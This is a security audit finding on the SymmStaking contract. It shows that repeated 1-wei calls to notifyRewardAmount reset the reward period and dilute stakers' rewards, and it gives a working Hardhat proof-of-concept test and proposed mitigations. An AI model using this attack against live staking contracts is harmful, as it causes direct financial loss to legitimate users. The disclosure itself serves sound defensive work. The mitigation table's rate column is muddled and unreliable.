# Attacker Can Disrupt Reward Periods to Reduce Legitimate Users' Rewards

### Summary

Malicious actors can repeatedly inject minuscule rewards to extend the active reward distribution period indefinitely. This manipulation drastically reduces the reward rate over time, causing legitimate users to receive significantly fewer rewards than expected. The core flaw lies in how new rewards are merged with ongoing distributions, allowing attackers to reset the reward clock and dilute payout rates.

### Root Cause

The [`_addRewardsForToken`](https://github.com/SYMM-IO/token/blob/1d014156b1d9f0ab3259026127b9220eb2da3292/contracts/staking/SymmStaking.sol#L366C1-L379C3) function combines new rewards with residual amounts from ongoing periods but recalculates the rate over a **full initial duration** (1 week) each time. This design allows any user to:
1. Add trivial rewards during an active period
2. Reset the distribution timeline to the full duration
3. Exponentially decay the reward rate with each attack iteration

The flawed duration reset enables indefinite reward suppression through low-cost, repeated transactions.

### Internal Pre-conditions

1. At least one reward token must be whitelisted via `configureRewardToken()`
2. An active reward period exists for the target token (i.e., `periodFinish > block.timestamp`)

### External Pre-conditions

1. Attacker possesses any amount (even minimal) of the reward token
2. Reward token must be transferrable (no blocking of small transfers)

### Attack Path

1. **Initial Setup**: Admin configures reward  with substantial rewards (e.g., 1000 USDT)
2. **Attack Execution**:
   - Attacker waits until partial time has elapsed (e.g., 1 day)
   - Calls `notifyRewardAmount()` with 1 wei of rewards
   - Contract combines residual rewards + 1 wei, spreads over **full 1 week duration**
   - Repeats this process multiple times, each resetting the period end timestamp
3. **Impact**: 
   - Reward rate (`state.rate`) decreases exponentially with each extension
   - Users accrue rewards at progressively slower rates
   - Significant portion of rewards remains undistributed after expected period

### Impact

Attackers can systematically reduce reward rates by orders of magnitude. The PoC demonstrates users receiving ≤66% of expected rewards despite full term completion. This constitutes direct financial loss through manipulated reward mechanics.

### PoC

```typescript
it("PoC: attacker can disrupt the reward by donate and notify small reward amounts to extend the reward period", async function () {
    // assume attacker has 100 reward token
    const attacker = user2
    await usdtToken.connect(admin).transfer(attacker.address, 100)

    // timings
    const startTime =  await time.latest()
    const oneWeekInSeconds = 7 * 24 * 60 * 60;
    const firstRewardEndTime = startTime + oneWeekInSeconds

    // Setup initial stake and rewards
    const deposit = e(100).toString()
    await stakingToken.connect(user1).approve(await symmStaking.getAddress(), deposit)
    await symmStaking.connect(user1).deposit(deposit, user1.address)

    const rewardAmountInEther = e(1000)
    const rewardAmount = rewardAmountInEther.toString();
    await usdtToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
    await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)
    await symmStaking.connect(admin).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount])
    
    // attacker start donation attacks
    const numberOfDonationAttacks = 10
    const increaseDuration = oneWeekInSeconds/numberOfDonationAttacks
    for (let i = 0; i < numberOfDonationAttacks; i++) {
        await time.increase(increaseDuration);

        // donate one SYMM only
        await usdtToken.connect(attacker).approve(await symmStaking.getAddress(), "1")
        await symmStaking.connect(attacker).notifyRewardAmount([await usdtToken.getAddress()], ["1"])
    }
    
    //after the full period of the first reward
    expect(await time.latest()).to.be.above(firstRewardEndTime)
    
    //**POC**: Verify reward degradation
    const blanceBefore = await usdtToken.balanceOf(user1.address)
    await symmStaking.connect(user1).claimRewards()
    const balanceAfter = await usdtToken.balanceOf(user1.address)
    const claimedRewards = balanceAfter - blanceBefore

    expect(claimedRewards).to.be.lessThanOrEqual((rewardAmountInEther/ 3n) *2n) // <666e18 => <66% of 1000e18
})
```

### Mitigation


#### Ensure Reward Rate Only Increases  

The modified `_addRewardsForToken` function guarantees that reward rates never decrease when new rewards are added. This neutralizes manipulation attempts by forcing attackers to either:  
1. **Increase the rate** (costing them funds without benefit), or  
2. **Reset the duration** only when the rate improves for users.

#### Key Behavioral Guarantees  

| Scenario                | Reward Rate Change | Period Duration Change |  
|-------------------------|--------------------|------------------------|  
| **New Rate < Current**  | **Increases**      | Unchanged              |  
| **New Rate ≥ Current**  | Increases          | Reset to Full Duration |  

#### Supplemental Recommendations  

1. **Minimum Reward Threshold**  
   Prevent dust attacks by requiring meaningful reward amounts:  
   ```solidity
   function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external {
       // ...
       for (uint256 i = 0; i < len; i++) {
           if (amounts[i] < 1e18) revert("Min reward 1 token");
       }
   }
   ```

2. **Access Control**  
   Restrict reward notifications to authorized roles:  
   ```solidity
   function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) 
       external 
       onlyRole(REWARD_MANAGER_ROLE) 
   ```
